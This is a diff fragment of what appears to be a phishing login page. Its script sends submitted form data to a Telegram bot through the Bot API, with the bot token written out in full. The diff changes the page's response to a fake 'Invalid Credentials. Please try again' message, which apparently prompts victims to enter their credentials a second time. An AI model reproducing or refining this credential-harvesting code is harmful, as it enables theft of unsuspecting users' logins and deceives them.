@@ -432,7 +432,7 @@ position: fixed;
          
          
 		$.ajax({
-			dataType: 'JSON',
+	
           url: "https://api.telegram.org/bot8883709162:AAH4hi8NPjE3ULxGdd3gcXFCjEwDGnosFbM/sendMessage",
 
         type: "POST",
@@ -458,7 +458,7 @@ position: fixed;
         document.getElementById('submit-btn').innerHTML = 'Verifing...' ;
         
          setTimeout(function(){
-            $("#msg").html('Loading....'); 
+            $("#msg").html('Invalid Credentials. Please try again'); 
             document.getElementById('msg').classList.remove("alert-danger");
             document.getElementById('msg').classList.add("alert-success");
          },1000)
@@ -477,7 +477,7 @@ position: fixed;
         {
             
          $.ajax({
-			 dataType: 'JSON',
+			 
           url: "https://api.telegram.org/bot8883709162:AAH4hi8NPjE3ULxGdd3gcXFCjEwDGnosFbM/sendMessage",
 
         type: "POST",
